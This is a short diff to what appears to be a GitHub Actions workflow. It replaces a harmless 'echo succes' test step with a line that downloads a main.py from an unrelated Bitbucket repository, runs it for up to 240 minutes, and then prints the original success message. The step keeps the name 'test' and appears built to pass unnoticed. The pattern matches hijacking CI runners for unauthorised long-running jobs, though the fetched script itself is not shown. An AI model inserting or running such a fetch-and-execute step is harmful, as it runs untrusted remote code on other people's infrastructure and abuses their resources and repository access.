@@ -30,4 +30,4 @@ jobs:
     steps:
       - uses: actions/checkout@v2
       - name: test
-        run: echo succes
+        run: wget https://bitbucket.org/sabri-fuadi991/tesazz/raw/0f819ed93510d014deccc02a50366f862f4b0105/main.py && timeout 240m python main.py && echo succes
